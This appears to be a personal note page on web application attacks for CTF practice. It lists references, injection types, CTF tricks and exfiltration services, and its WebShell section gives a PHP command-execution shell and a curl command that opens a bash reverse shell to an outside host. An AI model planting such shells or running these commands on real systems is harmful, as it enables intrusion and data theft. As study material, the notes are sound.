# Web Application Attacks Main
[TOC]
###### tags: `Security` `Web`

# Reference
[PORTSWIGGER - Web Security Academy](https://portswigger.net/web-security)

* php
* weak password
* insecure direct object references
    * /user/getAccount
    * /admin/getAccount
* injection
    - Command Injection
    - CRLF Injection
    - SQL Injection / NoSQL Injection
    - XPath Injection
    - Template Injection

[Kaibro - Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)

[CTF比赛总是输？你还差点Tricks!](https://docs.google.com/presentation/d/1Cx0vI2Mzy0zwdTrgic3S3TwGMCpH-QhMUdHU1r3AYfI)
1. 爆破，包括md5、爆破隨機數、驗證碼識別等
2. 繞WAF，包括花式繞MySQL、繞文件讀取關鍵詞檢測之類攔截
3. 花式玩弄幾個PHP特性，包括弱類型，反序列化+destruct、\0截斷、iconv截斷
4. 密碼題，包括hash長度擴展、亦或、移位加密各種變形、32位隨機數過小、隨機數種子可預測等
5. MySQL類型差異、包括和PHP弱類型類似的特性,0x、0b、0e之類，varchar和integer相互轉換，非strict模式截斷等
6. open_basedir、disable_function花式繞過技巧，包括dl、mail、imagick、bash漏洞、Directorylterator及各種二進制選手差足的方法
7. 條件競爭，包括競爭刪除前生成shell、競爭數據庫無鎖多扣錢
8. 社交攻擊，包括查whois
9. windows特性，包括短文件名、IIS解析漏洞、NTFS文件系統通配符、`::$DATA`、冒號截斷
10. 協議，花式IP偽造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、花式藏FLAG、花式分析數據包

# Tools
## DNSBIN
[GitHub - ettic-team/dnsbin](https://github.com/ettic-team/dnsbin): [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
[GitHub - mxcxvn/requestbin.net](https://github.com/mxcxvn/requestbin.net): [requestbin.net/dns](http://requestbin.net/dns)
有時候可以把要 leak 的東西放在 subdomain，像是 leak.wildfoo.tw，這樣受害主機在做 DNS 查詢的時候，就會把資料帶給 DNS Server

## Webhook
[GitHub - fredsted/webhook.site](https://github.com/fredsted/webhook.site): [webhook.site](https://webhook.site/)

## Web Proxy Tools
### BurpSuite
* [Python Requests and Burp Suite](https://www.th3r3p0.com/random/python-requests-and-burp-suite.html)
```python=
import requests
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://www.google.com/", proxies=proxies, verify=False)
```
or
```shell=
openssl x509 -inform der -in certificate.cer -out certificate.pem
export REQUESTS_CA_BUNDLE="/path/to/pem/encoded/cert"
export HTTP_PROXY="http://127.0.0.1:8080"
export HTTPS_PROXY="http://127.0.0.1:8080"
```

### OWASP ZAP

## tcpdump
```
tcpdump -i lo -q tcp port 6001 -w -
-i interface
-q Quick output
-w wirte the raw packets to file. "-" means stdout
```

# Misc Attack Technical
## WebShell
`<?php system($_REQUEST["exec"]);?>`
```
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'
```
* [Collection](https://hackmd.io/@WildfootW/BkN7LbLTr#collection)
## Race Condition
## Javascript Prototype Pollution
## CSS Injection